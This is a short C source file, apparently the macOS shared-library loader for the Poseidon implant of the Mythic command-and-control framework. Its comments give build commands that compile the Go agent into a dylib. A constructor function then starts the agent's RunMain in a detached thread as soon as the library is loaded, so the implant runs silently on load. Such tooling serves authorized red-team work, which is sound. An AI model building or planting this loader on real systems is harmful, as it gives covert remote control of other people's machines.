#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <assert.h>
#include <pthread.h>
#include "poseidon-darwin-10.12-amd64.h" //Change the header file if something different was used
// To build :
// 1. (this is done as part of building through mythic) Build a c-archive in golang: go build -buildmode=c-archive -o poseidon-darwin-10.12-amd64.a -tags=[profile] poseidon.go
// 2. Execute: ranlib poseidon-darwin-10.12-amd64.a
// 3. Build a shared lib (darwin): clang -shared -framework Foundation -framework CoreGraphics -framework Security -framework ApplicationServices -framework OSAKit -framework AppKit -framework OpenDirectory -fpic sharedlib-darwin-linux.c poseidon-darwin-10.12-amd64.a -o poseidon.dylib

// Test Dylib execution with python3
// python3
// import ctypes
// ctypes.CDLL("./poseidon.dylib")

__attribute__ ((constructor)) void initializer()
{
	pthread_attr_t  attr;
    pthread_t       posixThreadID;
    int             returnVal;
    
    returnVal = pthread_attr_init(&attr);
    assert(!returnVal);
    returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    assert(!returnVal);
    pthread_create(&posixThreadID, &attr, &RunMain, NULL);
}
